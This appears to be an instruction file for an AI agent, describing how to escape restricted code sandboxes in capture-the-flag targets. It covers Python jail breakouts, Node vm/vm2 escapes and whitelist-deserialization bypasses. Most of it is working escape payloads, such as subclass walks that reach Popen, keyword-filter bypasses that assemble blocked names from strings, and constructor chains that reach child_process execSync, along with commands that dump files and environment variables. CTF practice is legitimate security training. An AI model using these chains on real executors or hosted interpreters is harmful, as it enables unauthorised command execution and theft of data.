---
name: sandbox-escape-methodology
description: Use when a target runs user-supplied code in a restricted sandbox (online Python/JavaScript executor, restricted eval, deserialization with whitelist) and you must escape it to read files or execute commands. Covers Python jail escapes, JS vm/isolate escapes, and safe-deserialization bypass patterns.
---

# Sandbox / Jail Escape Methodology

Authorized testing only. Target runs your code but restricts it. Goal: break out to read the flag or run commands.

## Python Sandbox Escape

Restrictions usually blacklist keywords (`import`, `os`, `eval`, `__`) or `exec` in a limited namespace.

**Recon:** determine what's blocked — probe `import os`, `open`, `__import__`, `eval`, dunder access, builtins presence.

**Escape primitives (try in order):**
- Direct: `__import__('os').system('cat /flag')` or `().__class__.__base__.__subclasses__()` walk to find `Popen`/`os` module.
- Builtins recovery: `[].__class__.__mro__[1].__subclasses__()` then find `subprocess.Popen` or `os._wrap_close` → `().__init__.__globals__['system']`.
- `getattr` / `vars` / `globals()` to reach blocked names by string assembly: `getattr(__import__('o'+'s'),'sys'+'tem')`.
- Bypass keyword filter: string concat, hex/unicode escapes, `\x5f\x5f`, `chr()` building, `getattr`.
- Read file without os: `open('/flag').read()`, or `[c for c in ().__class__.__base__.__subclasses__() if 'catch_warnings' in c.__name__][0]()._module.__builtins__['open']`.
- `breakpoint()`, `help()`, `input` pager, format-string `{0.__class__}` if it goes through `.format`.
- If `import` allowed but `os` blocked: `import subprocess`, `import posix`, `import ctypes`, `import pty`.

## JavaScript vm/Sandbox Escape

Node `vm` module and libraries (`vm2`, `isolated-vm`) have known escape chains.

- Reach the host `constructor`: `this.constructor.constructor('return process')()` → `process.mainModule.require('child_process').execSync('cat /flag')`.
- `vm2` historically had multiple CVEs (proxy/prototype escapes) — identify the exact library/version, look up the matching PoC.
- Prototype pollution to reach `require`.
- `arguments.callee.caller` chain to escape closure.
- If `process` blocked: reach it via error stack, `Function('return this')()`, or Reflect.

## Deserialization Bypass (whitelist)

Target deserializes user input but whitelists allowed classes.

- **Python pickle:** whitelist via `find_class` — look for allowed classes with dangerous `__reduce__`/`__setstate__`, or gadget chains through allowed modules.
- **Java:** if whitelist is on classnames, look for allowed gadget classes (Commons-Collections, etc. still reachable); ysoserial gadget selection by available libs.
- **PHP:** `__wakeup`/`__destruct` magic methods on allowed classes; POP chains.
- **Node:** whitelisted types with dangerous toJSON/reviver.
- General: whitelist bypass = find an *allowed* class that itself triggers dangerous behavior, or a subclass/alias not covered by the exact-match whitelist.

## Approach

1. Enumerate the restriction precisely (what's blocked, what's allowed).
2. Find the minimal primitive that reaches a code-exec or file-read sink using only allowed constructs.
3. Assemble the escape, test with a harmless probe (`id`, `ls /`), then read the flag.
4. Flag is usually at `/flag`, `/flag.txt`, env, or CWD. `cat /flag* ; env ; ls -la /`.

## Output

Report: sandbox type, the restriction observed, the exact escape primitive/chain used, and the flag.
